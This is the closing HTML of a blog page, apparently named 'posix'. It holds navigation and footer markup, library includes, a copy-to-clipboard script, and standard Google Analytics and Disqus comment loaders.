fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>